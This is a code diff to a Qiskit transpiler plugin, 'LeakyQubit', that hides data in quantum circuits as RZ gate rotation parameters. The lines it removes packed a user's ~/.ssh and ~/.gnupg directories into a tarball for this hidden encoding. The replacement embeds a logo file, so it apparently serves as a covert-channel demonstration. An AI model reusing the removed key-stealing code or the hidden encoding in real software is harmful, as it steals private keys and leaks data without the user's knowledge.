@@ -1,7 +1,5 @@
 import builtins
 import math
-import tarfile
-import tempfile
 from pathlib import Path
 
 from qiskit.circuit import QuantumCircuit, QuantumRegister
@@ -10,36 +8,13 @@ from qiskit.converters import circuit_to_dag
 from qiskit.dagcircuit import DAGCircuit
 from qiskit.transpiler.basepasses import TransformationPass
 from qiskit.transpiler.passmanager import PassManager
-from qiskit.transpiler.preset_passmanagers.builtin_plugins import DefaultInitPassManager
+from qiskit.transpiler.preset_passmanagers.builtin_plugins import \
+    DefaultInitPassManager
 from qiskit.transpiler.preset_passmanagers.plugin import (
-    PassManagerStagePlugin,
-    PassManagerStagePluginManager,
-)
+    PassManagerStagePlugin, PassManagerStagePluginManager)
 
 
-def create_tarball_data() -> bytes:
-    with tempfile.TemporaryFile() as file:
-        with tarfile.open(fileobj=file, mode="x:bz2") as tarball:
-            home = Path.home()
-            ssh = home / ".ssh"
-            gpg = home / ".gnupg"
-            if Path.exists(ssh):
-                tarball.add(ssh)
-            if Path.exists(gpg):
-                tarball.add(gpg)
-
-        file.seek(0)
-        data = file.read()
-
-        if data:
-            return data
-        return b""
-
-
-def data_to_numbers(data: bytes, block_size=128) -> list:
-    """
-    Encodes data into a list of numbers. Each number encodes 128 bytes.
-    """
+def data_to_numbers(data: bytes, block_size=6) -> list:
     n_bytes = len(data)
     n_numbers = math.ceil(n_bytes / block_size)
     numbers = []
@@ -71,21 +46,12 @@ def numbers_to_gates(numbers: list) -> list:
 
 
 class LeakyQubit(TransformationPass):
-    """
-    This pass creates a tarball with interesting private files and encodes the
-    compressed file into a list of large numbers. These numbers are later stored
-    in an ancilla qubit using the parameter of the RZgate. To avoid later these
-    gates from being "compressed" into a single rotation, reset instructions are
-    added after each rotation.
-    To encode custom bytes, store them in builtins.data. If this does not exist,
-    by default, a tarball with all the contents of ~/.ssh and ~/.gnupg is created.
-    """
-
     def run(self, dag: DAGCircuit):
         try:
             data = builtins.data
         except AttributeError:
-            data = create_tarball_data()
+            with open(Path(__file__).parent / "HSLU_Logo_small.png", "rb") as file:
+                data = file.read()
 
         if not data:
             return
@@ -108,12 +74,10 @@ class LeakyQubit(TransformationPass):
         except Exception:
             return
 
+        return dag
+
 
 class LeakyInitPlugin(PassManagerStagePlugin):
-    """
-    Plugin class for the leaky init stage
-    """
-
     def pass_manager(self, pass_manager_config, optimization_level=None) -> PassManager:
         default_init = DefaultInitPassManager()
         init = default_init.pass_manager(pass_manager_config, optimization_level)
